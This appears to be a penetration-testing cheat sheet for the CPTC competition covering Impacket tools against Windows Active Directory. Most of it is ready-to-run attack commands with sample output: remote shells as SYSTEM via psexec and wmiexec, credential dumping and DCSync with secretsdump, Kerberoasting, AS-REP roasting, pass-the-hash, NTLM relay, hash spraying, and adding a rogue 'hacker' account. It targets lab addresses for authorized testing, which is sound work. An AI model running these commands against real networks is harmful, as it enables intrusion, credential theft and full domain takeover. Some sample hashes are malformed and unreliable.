# Impacket - CPTC Quick Reference

## What is Impacket & Why It's Critical

**Impacket = Swiss Army knife for Windows/AD attacks from Linux**

**Why you need it for CPTC:**
- ✅ Remote code execution on Windows (no RDP needed)
- ✅ Dump credentials from remote machines
- ✅ Kerberos attacks (Kerberoasting, AS-REP roasting)
- ✅ Pass-the-Hash, Pass-the-Ticket
- ✅ DCSync (dump entire domain)
- ✅ Works from Kali → Windows targets

**Time to value:** 30 seconds per attack

---

## Installation (One-Time)

```bash
# Kali (usually pre-installed)
impacket-psexec -h

# If missing:
pip3 install impacket

# Or latest from GitHub:
git clone https://github.com/fortra/impacket
cd impacket
pip3 install .
```

**Verify:**
```bash
impacket-psexec -h
impacket-secretsdump -h
impacket-GetUserSPNs -h
```

---

## Core Tools - When to Use What

| Tool | Use When | Time | Impact |
|------|----------|------|--------|
| **psexec.py** | Need shell on Windows | 10 sec | RCE as SYSTEM |
| **secretsdump.py** | Have admin, need more creds | 30 sec | All local/domain hashes |
| **GetUserSPNs.py** | Have domain user, need escalation | 1 min | Service account creds |
| **GetNPUsers.py** | Have usernames, no password | 1 min | User hashes (no auth needed) |
| **wmiexec.py** | psexec detected/blocked | 10 sec | RCE (stealthier) |
| **smbexec.py** | Need semi-interactive shell | 10 sec | RCE via SMB |
| **atexec.py** | One-off command execution | 5 sec | Single command RCE |
| **getTGT.py** | Have password, need Kerberos ticket | 5 sec | TGT for other attacks |
| **ntlmrelayx.py** | NTLM relay attack | 2 min | Relay auth to targets |

---

## 1. Remote Code Execution (RCE)

### psexec.py - Interactive Shell (Most Common)

**When:** You have admin credentials, need full shell

```bash
# With password
impacket-psexec 'CORP/administrator:Password123@10.10.10.10'

# With NTLM hash (Pass-the-Hash)
impacket-psexec -hashes ':8846f7eaee8fb117ad06bdd830b7586c' 'administrator@10.10.10.10'

# Specify domain controller
impacket-psexec 'CORP/administrator:Password123@10.10.10.10' -dc-ip 10.10.10.5

# Output:
# C:\Windows\system32> whoami
# nt authority\system    ← You have SYSTEM (highest privilege)
```

**What it does:**
- Uploads service executable via SMB
- Creates Windows service
- Executes commands as SYSTEM
- Interactive shell

**Time: 10 seconds to shell**

---

### wmiexec.py - Stealthier Alternative

**When:** psexec is blocked/detected

```bash
# Same syntax as psexec
impacket-wmiexec 'CORP/administrator:Password123@10.10.10.10'

# With hash
impacket-wmiexec -hashes ':HASH' 'administrator@10.10.10.10'
```

**Advantages over psexec:**
- No service creation (stealthier)
- Uses WMI (Windows Management Instrumentation)
- Less likely to be blocked

**Time: 10 seconds**

---

### smbexec.py - Semi-Interactive

**When:** Need command execution via SMB

```bash
impacket-smbexec 'CORP/administrator:Password123@10.10.10.10'
```

**Differences:**
- Semi-interactive (less smooth than psexec)
- Uses SMB + cmd.exe
- Good fallback option

---

### atexec.py - Single Command

**When:** Just need to run ONE command (fast)

```bash
# Run single command
impacket-atexec 'CORP/administrator:Password123@10.10.10.10' 'whoami'

# Output: Shows command result, no shell

# Use for quick checks:
impacket-atexec 'CORP/admin:pass@10.10.10.10' 'ipconfig'
impacket-atexec 'CORP/admin:pass@10.10.10.10' 'net user hacker Pass123! /add'
```

**Time: 5 seconds per command**

---

## 2. Credential Dumping

### secretsdump.py - The Most Important Tool

**When:** You have admin, need to extract ALL credentials

```bash
# Dump everything (SAM, LSA, cached creds)
impacket-secretsdump 'CORP/administrator:Password123@10.10.10.10'

# With hash (Pass-the-Hash)
impacket-secretsdump -hashes ':HASH' 'administrator@10.10.10.10'

# Dump ONLY domain hashes (DCSync attack)
impacket-secretsdump 'CORP/administrator:Password123@10.10.10.10' -just-dc

# Dump ONLY specific user (faster)
impacket-secretsdump 'CORP/administrator:Password123@10.10.10.10' -just-dc-user krbtgt

# Save output to file
impacket-secretsdump 'CORP/admin:pass@10.10.10.10' -just-dc -outputfile domain-hashes
```

---

### What You Get from secretsdump:

**Local Machine Hashes (SAM):**
```
[*] Dumping local SAM hashes
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

**Domain Hashes (DCSync - if targeting DC):**
```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash:::)
CORP\Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
CORP\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1a2b3c4d5e6f7g8h9i0j:::  ← GOLDEN TICKET!
CORP\DA-Admin:1104:aad3b435b51404eeaad3b435b51404ee:abc123def456:::
```

**LSA Secrets (passwords stored by system):**
```
[*] Dumping LSA Secrets
_SC_MyService:MyServicePassword123!   ← Service account password in cleartext!
```

---

### DCSync Attack - Dump Entire Domain

**When:** You have admin on DC OR have DCSync rights

```bash
# Dump ALL domain users (takes longer)
impacket-secretsdump 'CORP/administrator:Password123@DC01.corp.local' -just-dc

# Only dump krbtgt (for golden ticket)
impacket-secretsdump 'CORP/admin:pass@DC01' -just-dc-user krbtgt

# Only dump specific user
impacket-secretsdump 'CORP/admin:pass@DC01' -just-dc-user DA-Admin
```

**What is DCSync?**
- Mimics domain controller replication
- Requests password hashes from DC
- No need to log onto DC directly
- **Requires:** Domain Admin, Enterprise Admin, OR special DCSync rights

**Time: 30 seconds to 2 minutes (depending on domain size)**

---

### secretsdump Quick Wins:

**Scenario 1: Admin on workstation**
```bash
# Dump local creds
impacket-secretsdump 'WORKSTATION01/administrator:pass@10.10.10.20'

# Look for:
# - Other admin account hashes (lateral movement)
# - Cached domain credentials
# - LSA secrets (service passwords)
```

**Scenario 2: Admin on DC**
```bash
# Dump entire domain
impacket-secretsdump 'CORP/administrator:pass@DC01' -just-dc -outputfile corp-domain

# Files created:
# corp-domain.ntds (all hashes)
# Use these for: Pass-the-Hash, crack offline, golden tickets
```

---

## 3. Kerberos Attacks

### GetUserSPNs.py - Kerberoasting

**When:** You have domain user creds, need to escalate

**What it does:** Request service tickets (TGS) for accounts with SPNs, crack offline

```bash
# Find & request all SPNs
impacket-GetUserSPNs -request -dc-ip 10.10.10.10 'CORP/user:Password123'

# Output:
ServicePrincipalName    Name        MemberOf    PasswordLastSet
MSSQLSvc/SQL01:1433    sqlservice  ...         2020-01-15 10:23:45  ← OLD password!
HTTP/web01             webservice  ...         2024-10-01 14:22:33

$krb5tgs$23$*sqlservice$CORP.LOCAL$MSSQLSvc/SQL01:1433*$abc123...  ← Hash to crack

# Save to file
impacket-GetUserSPNs -request -dc-ip 10.10.10.10 'CORP/user:pass' -outputfile spn-hashes.txt
```

**Crack hashes:**
```bash
hashcat -m 13100 spn-hashes.txt /usr/share/wordlists/rockyou.txt

# Or
john --wordlist=rockyou.txt spn-hashes.txt
```

**Time:**
- Request SPNs: **30 seconds**
- Crack (depends on password): **seconds to hours**
  - Weak password: 1-5 minutes
  - Strong password: May not crack

**Priority:** Focus on accounts with old passwords (PasswordLastSet > 1 year ago)

---

### GetNPUsers.py - AS-REP Roasting

**When:** You have list of usernames, NO password needed

**What it does:** Request AS-REP for accounts with "Do not require Kerberos preauthentication"

```bash
# With username list
impacket-GetNPUsers CORP/ -usersfile users.txt -dc-ip 10.10.10.10

# Try common usernames (no file)
impacket-GetNPUsers CORP/ -dc-ip 10.10.10.10 -no-pass

# Output (if vulnerable user found):
$krb5asrep$23$user@CORP.LOCAL:abc123def456...  ← Crackable hash!

# Save to file
impacket-GetNPUsers CORP/ -usersfile users.txt -dc-ip 10.10.10.10 -format hashcat -outputfile asrep-hashes.txt
```

**Crack:**
```bash
hashcat -m 18200 asrep-hashes.txt rockyou.txt
```

**Advantages:**
- ✅ No authentication needed (only usernames)
- ✅ Often overlooked misconfiguration
- ✅ Can be done from unauthenticated position

**Time: 1 minute to get hashes**

---

### getTGT.py - Get Kerberos Ticket

**When:** Have password/hash, need Kerberos ticket for other attacks

```bash
# Get TGT with password
impacket-getTGT 'CORP/user:Password123' -dc-ip 10.10.10.10

# Get TGT with hash
impacket-getTGT -hashes ':NTLM_HASH' 'CORP/administrator' -dc-ip 10.10.10.10

# Output: user.ccache (Kerberos ticket file)

# Use ticket with other tools:
export KRB5CCNAME=user.ccache
impacket-psexec -k -no-pass 'administrator@DC01.corp.local'
```

---

## 4. Credential Formats & Authentication Methods

### Standard Credential Formats:

```bash
# Format: domain/username:password@target
impacket-psexec 'CORP/admin:Password123@10.10.10.10'

# Without domain (local auth)
impacket-psexec 'administrator:Password123@10.10.10.10' -dc-ip 10.10.10.10

# Just username@target (will prompt for password)
impacket-psexec 'admin@10.10.10.10'
```

---

### Pass-the-Hash (Most Common in CPTC):

```bash
# Format: -hashes LM:NT
# LM hash usually empty: aad3b435b51404eeaad3b435b51404ee

# Pass-the-Hash syntax:
impacket-psexec -hashes ':8846f7eaee8fb117ad06bdd830b7586c' 'administrator@10.10.10.10'

# Works with any tool:
impacket-secretsdump -hashes ':HASH' 'admin@10.10.10.10'
impacket-wmiexec -hashes ':HASH' 'admin@10.10.10.10'
```

**When you have hash but not password:** Use this!

---

### Kerberos Authentication:

```bash
# Use existing TGT
export KRB5CCNAME=/path/to/ticket.ccache

# Use -k flag (Kerberos) and -no-pass
impacket-psexec -k -no-pass 'administrator@DC01.corp.local'

# Note: Use FQDN (DC01.corp.local) not IP when using Kerberos
```

---

## 5. Advanced Techniques

### ntlmrelayx.py - NTLM Relay Attack

**When:** SMB signing disabled, can coerce authentication

```bash
# Start relay (listens for NTLM auth, relays to target)
impacket-ntlmrelayx -t 10.10.10.10 -smb2support

# Coerce authentication from another terminal:
# (using PrinterBug, PetitPotam, etc.)

# When target authenticates:
# - Automatically relays to 10.10.10.10
# - Executes commands or dumps secrets
```

**CPTC Usage:** Usually skip (requires coercion setup, time-consuming)

---

### getST.py - Get Service Ticket

**When:** Silver ticket attack or S4U2Self abuse

```bash
# Request service ticket
impacket-getST -spn 'cifs/target.corp.local' -impersonate administrator 'CORP/user:pass'
```

**CPTC:** Rarely needed, focus on faster techniques

---

## Quick Decision Tree

```
Do you have credentials?
├─ YES (password or hash)
│   ├─ Need shell? → psexec.py / wmiexec.py
│   ├─ Need more creds? → secretsdump.py
│   ├─ Admin on DC? → secretsdump.py -just-dc (DCSync)
│   └─ Just domain user? → GetUserSPNs.py (Kerberoast)
│
└─ NO credentials
    └─ Have usernames? → GetNPUsers.py (AS-REP roast)
```

---

## CPTC Workflow Examples

### Scenario 1: Just Got Domain User Creds

```bash
# 1. Kerberoast (1 min)
impacket-GetUserSPNs -request -dc-ip 10.10.10.10 'CORP/user:Password123' -outputfile spns.txt

# 2. Start cracking in background
hashcat -m 13100 spns.txt rockyou.txt &

# 3. AS-REP roast (1 min)
impacket-GetNPUsers CORP/ -dc-ip 10.10.10.10 -usersfile common-users.txt -format hashcat -outputfile asrep.txt

# 4. Check BloodHound/Certipy while hashes crack
```

---

### Scenario 2: Admin on Workstation

```bash
# 1. Dump local creds (30 sec)
impacket-secretsdump 'WORKSTATION01/administrator:pass@10.10.10.20'

# 2. Extract hashes from output
# 3. Spray hashes across network (find where admin works)
crackmapexec smb 10.10.10.0/24 -u administrator -H 'HASH' --local-auth

# 4. Dump creds from all accessible machines
for ip in 10.10.10.{21,22,23}; do
    impacket-secretsdump -hashes ':HASH' "administrator@$ip"
done
```

---

### Scenario 3: Domain Admin Achieved

```bash
# 1. DCSync entire domain (1 min)
impacket-secretsdump 'CORP/administrator:pass@DC01.corp.local' -just-dc -outputfile corp-domain

# Output files:
# corp-domain.ntds      ← All domain hashes
# corp-domain.ntds.kerberos  ← Kerberos keys
# corp-domain.ntds.cleartext ← Cleartext passwords (if any)

# 2. Extract krbtgt hash (for golden ticket)
grep krbtgt corp-domain.ntds
# CORP\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1a2b3c4d5e6f:::

# 3. Access ANY machine
impacket-psexec -hashes ':1a2b3c4d5e6f' 'administrator@FILESERVER01'
```

---

## Common Errors & Fixes

### Error: "Connection refused" or "Connection timeout"

**Cause:** Firewall blocking, wrong IP, or service not running

**Fix:**
```bash
# Check if SMB port open
nmap -p 445 10.10.10.10

# Try different IP (DC vs member server)
# Ensure you're using correct target
```

---

### Error: "STATUS_LOGON_FAILURE"

**Cause:** Wrong credentials or account locked

**Fix:**
```bash
# Verify creds with crackmapexec first
crackmapexec smb 10.10.10.10 -u user -p pass

# Check account status
impacket-lookupsid 'CORP/user:pass@10.10.10.10'
```

---

### Error: "STATUS_ACCESS_DENIED" (secretsdump)

**Cause:** Account isn't admin or doesn't have DCSync rights

**Fix:**
```bash
# Verify admin status
crackmapexec smb 10.10.10.10 -u user -p pass

# Look for (Pwn3d!) indicator
# If missing, you're not admin
```

---

### Error: Clock skew (Kerberos)

**Cause:** Time difference between attacker and DC

**Fix:**
```bash
# Sync time with DC
sudo ntpdate -u 10.10.10.10

# Or
sudo timedatectl set-ntp true
```

---

## Tool Comparison - Which Shell?

| Tool | Speed | Stealth | Stability | Use When |
|------|-------|---------|-----------|----------|
| **psexec.py** | Fast | Low (creates service) | Stable | Default choice |
| **wmiexec.py** | Fast | Medium (uses WMI) | Stable | psexec blocked |
| **smbexec.py** | Medium | Medium | Less stable | Fallback |
| **atexec.py** | Very fast | Medium | N/A (single cmd) | Quick commands |

**CPTC Recommendation:** Try psexec.py first, use wmiexec.py if blocked

---

## Evidence Collection

**For every Impacket command, save:**

1. **Command used:**
```bash
impacket-secretsdump 'CORP/administrator:Password123@10.10.10.10' -just-dc
```

2. **Output (screenshot or copy):**
```
[*] Dumping Domain Credentials
CORP\Administrator:500:aad3...:::
CORP\krbtgt:502:aad3...:::
[+] Dumped 125 users
```

3. **Impact statement:**
```
Domain Administrator credentials obtained via DCSync attack.
Full domain compromise achieved. All user password hashes extracted.
```

---

## Time Budgets

| Task | Expected Time | If Taking Longer |
|------|---------------|------------------|
| psexec shell | 10 seconds | Check firewall, try wmiexec |
| secretsdump local | 30 seconds | Normal |
| secretsdump DCSync | 1-2 minutes | Normal for large domains |
| Kerberoasting | 30 seconds | Normal |
| Cracking SPNs | 5 min - 2 hours | Leave in background |
| AS-REP roasting | 1 minute | Normal |

---

## Quick Command Reference

```bash
# RCE
impacket-psexec 'CORP/admin:pass@IP'
impacket-psexec -hashes ':HASH' 'admin@IP'
impacket-wmiexec 'CORP/admin:pass@IP'
impacket-atexec 'CORP/admin:pass@IP' 'whoami'

# Credential Dumping
impacket-secretsdump 'CORP/admin:pass@IP'
impacket-secretsdump -hashes ':HASH' 'admin@IP'
impacket-secretsdump 'CORP/admin:pass@DC' -just-dc
impacket-secretsdump 'CORP/admin:pass@DC' -just-dc-user krbtgt

# Kerberos Attacks
impacket-GetUserSPNs -request -dc-ip DC-IP 'CORP/user:pass'
impacket-GetNPUsers CORP/ -usersfile users.txt -dc-ip DC-IP
impacket-getTGT 'CORP/user:pass' -dc-ip DC-IP

# Kerberos Auth
export KRB5CCNAME=ticket.ccache
impacket-psexec -k -no-pass 'admin@DC.corp.local'
```

---

## Integration with Other Tools

### Impacket + BloodHound
```bash
# BloodHound finds: User has GenericAll on admin
# Impacket exploits it:
# 1. Change admin password (outside Impacket scope, use PowerView)
# 2. Use new creds with psexec:
impacket-psexec 'CORP/admin:NewPass123@TARGET'
```

### Impacket + Mimikatz Results
```bash
# Mimikatz on Windows dumps hash
# Use hash with Impacket from Kali:
impacket-psexec -hashes ':HASH' 'admin@NEXT-TARGET'
```

### Impacket + Certipy
```bash
# Certipy gets cert → auth → hash
certipy auth -pfx admin.pfx -dc-ip DC-IP
# Output: Got hash: abc123...

# Use hash with Impacket:
impacket-secretsdump -hashes ':abc123' 'admin@DC-IP' -just-dc
```

---

## Final Tips

**Speed Optimization:**
- Use `-hashes` flag (faster than password auth)
- Save secretsdump output to files (`-outputfile`)
- Run Kerberoasting early, crack in background
- Use wmiexec if psexec is slow/blocked

**Common Mistakes:**
- Using IP instead of FQDN with Kerberos (`-k` flag)
- Forgetting `-dc-ip` when using domain accounts
- Not saving secretsdump output (re-running wastes time)
- Trying to crack strong passwords (move on after 5 min)

**CPTC Success:**
```
Get admin → secretsdump → more hashes → lateral movement → DA → DCSync
```

**Total Time:** 5-10 minutes from first admin to full domain compromise
